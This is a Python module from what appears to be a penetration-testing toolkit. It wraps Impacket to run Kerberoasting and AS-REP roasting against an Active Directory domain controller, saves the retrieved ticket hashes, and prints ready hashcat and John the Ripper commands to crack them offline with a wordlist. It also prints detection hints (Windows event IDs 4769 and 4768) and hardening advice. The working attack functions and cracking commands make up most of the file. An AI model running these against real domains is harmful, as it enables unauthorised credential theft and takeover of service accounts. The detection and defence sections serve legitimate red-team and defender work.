from __future__ import annotations

import shutil

from rich.prompt import Prompt

from .utils import console, get_wsl_distro, header, pause, resolve_tool, run_tool


def _impacket(base: str) -> str | None:
    """Impacket scripts vary by distro: GetUserSPNs.py vs impacket-GetUserSPNs."""
    for name in (f"impacket-{base}", f"{base}.py", base):
        if resolve_tool(name):
            return name
    return None


def kerberoast() -> None:
    header("Kerberoast", "Request SPN service tickets -> offline-crackable TGS hashes")
    tool = _impacket("GetUserSPNs")
    if not tool:
        console.print("[yellow]Impacket GetUserSPNs not found[/] (native or WSL). "
                      "Install impacket via the Install Arsenal menu.")
        return pause()
    domain = Prompt.ask("Domain (e.g. corp.local)")
    user = Prompt.ask("Username (any authenticated domain user)")
    pw = Prompt.ask("Password")
    dc = Prompt.ask("DC IP")
    out = "kerberoast.hashes"
    args = [f"{domain}/{user}:{pw}", "-dc-ip", dc, "-request", "-outputfile", out]
    console.print("[dim]Requesting TGS tickets for accounts with SPNs set…[/]")
    run_tool(tool, args)
    console.print(f"\n[green]If successful, hashes are in {out}[/] — crack them:")
    console.print("  [cyan]john --format=krb5tgs --wordlist=rockyou.txt " + out + "[/]")
    console.print("  [cyan]hashcat -m 13100 " + out + " rockyou.txt[/]")
    _detect("Kerberoast",
            "Event ID 4769 (Kerberos service ticket requested) with Ticket "
            "Encryption Type 0x17 (RC4) and Ticket Options 0x40810000 — especially "
            "many 4769s from one account in a short window. Honeypot SPN accounts "
            "detect it with zero false positives.")


def asrep() -> None:
    header("AS-REP Roast", "Dump hashes for accounts with Kerberos pre-auth disabled")
    tool = _impacket("GetNPUsers")
    if not tool:
        console.print("[yellow]Impacket GetNPUsers not found[/] (native or WSL). "
                      "Install impacket via the Install Arsenal menu.")
        return pause()
    domain = Prompt.ask("Domain (e.g. corp.local)")
    mode = Prompt.ask("Target", choices=["userlist", "creds"], default="userlist")
    args: list[str]
    pathify: set[int] = set()
    if mode == "userlist":
        users = Prompt.ask("Path to username list")
        args = [f"{domain}/", "-usersfile", users, "-format", "hashcat", "-no-pass"]
        pathify = {2}
    else:
        user = Prompt.ask("Username")
        pw = Prompt.ask("Password")
        args = [f"{domain}/{user}:{pw}", "-format", "hashcat", "-request"]
    dc = Prompt.ask("DC IP")
    args += ["-dc-ip", dc]
    run_tool(tool, args, wsl_pathify=pathify)
    console.print("\n[green]Crack any recovered AS-REP hashes:[/]")
    console.print("  [cyan]hashcat -m 18200 asrep.hashes rockyou.txt[/]")
    console.print("  [cyan]john --format=krb5asrep --wordlist=rockyou.txt asrep.hashes[/]")
    _detect("AS-REP Roast",
            "Event ID 4768 (TGT requested) with pre-authentication type 0 and RC4 "
            "encryption. Also audit for accounts with 'Do not require Kerberos "
            "preauthentication' set (DONT_REQ_PREAUTH) — that flag is the root cause.")


def hardening() -> None:
    header("AD roasting: defenses", "Reduce exposure to both attacks")
    for line in [
        "[bold]Kerberoast[/]",
        "  · Use (Group) Managed Service Accounts — 120-char random passwords, auto-rotated.",
        "  · Long (25+ char) passwords on any service account with an SPN.",
        "  · Disable RC4 for Kerberos; require AES.",
        "  · Deploy honeypot SPN accounts and alert on any 4769 for them.",
        "",
        "[bold]AS-REP Roast[/]",
        "  · Remove 'Do not require Kerberos preauthentication' from all accounts.",
        "  · Strong passwords so offline cracking fails.",
        "  · Alert on 4768 with preauth type 0.",
    ]:
        console.print(line)
    pause()


def _detect(name: str, text: str) -> None:
    console.print(f"\n[bold]detection ({name}):[/] [bright_black]{text}[/]")
    pause()


MENU = {
    "1": ("Kerberoast (SPN tickets)", kerberoast),
    "2": ("AS-REP Roast (no-preauth)", asrep),
    "3": ("Defenses / hardening", hardening),
}
